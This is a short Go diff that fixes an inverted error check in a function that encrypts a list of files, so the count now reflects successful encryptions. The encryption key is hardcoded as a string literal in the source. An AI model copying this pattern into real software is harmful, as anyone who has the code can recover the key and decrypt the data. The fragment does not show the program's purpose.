@@ -9,7 +9,7 @@ func encryptFolder(files []string) int {
 	key := []byte("dj1f5GMFlyp]x,f.git1`58fiSldtf,v")
 	for _, filename := range files {
 		err := encrypt(filename, key)
-		if err != nil {
+		if err == nil {
 			cnt++
 		}
 	}
